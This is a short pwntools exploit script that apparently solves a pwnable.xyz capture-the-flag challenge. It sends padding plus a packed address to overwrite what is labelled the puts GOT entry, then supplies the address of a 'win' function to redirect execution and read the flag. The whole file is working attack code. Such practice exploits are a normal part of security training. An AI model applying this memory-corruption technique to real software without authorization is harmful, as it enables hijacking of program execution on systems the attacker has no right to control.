from pwn import *

context.log_level = "debug"
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30031)
puts_plt = 0x603018
win = 0x40099c
# gdb.attach(p)

p.recvuntil('>')
p.sendline('2')
p.recvuntil('nationality:')
p.send('AAAABBBBCCCCDDDD' + p64(puts_plt))

p.recvuntil('>')
p.sendline('3')
p.recvuntil('age:')
p.sendline(str(win))

p.recvuntil('>')
p.sendline('4')
p.recvuntil('}')
